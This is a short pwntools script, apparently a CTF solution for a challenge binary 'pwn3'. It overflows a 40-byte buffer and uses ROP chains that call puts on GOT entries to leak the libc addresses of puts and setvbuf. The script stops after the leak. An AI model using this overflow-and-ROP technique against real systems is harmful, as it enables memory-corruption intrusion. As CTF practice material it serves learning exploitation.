from pwn import *

context.log_level = 'error'
context.arch = 'amd64'

elf = ELF('./pwn3')
context.binary = elf
p = remote('challs.n00bzunit3d.xyz', 42450)

offset = 40

rop = ROP(elf)
rop.call(elf.symbols['puts'], [elf.got['puts']])
rop.call(elf.symbols['main'])

payload = [
    b'A' * offset,
    rop.chain()
]
payload = b''.join(payload)

p.recv()
p.sendline(payload)

p.recvline()
p.recvline()

puts = u64(p.recvline().strip().ljust(8, b'\x00'))

print(f'puts: {hex(puts)}')

rop = ROP(elf)
rop.call(elf.symbols['puts'], [elf.got['setvbuf']])
rop.call(elf.symbols['main'])

payload = [
    b'A' * offset,
    rop.chain()
]

payload = b''.join(payload)

p.recv()
p.sendline(payload)
p.recv()
p.recvline()

stdout = u64(p.recvline().strip().ljust(8, b'\x00'))
print(f'setvbuf: {hex(stdout)}')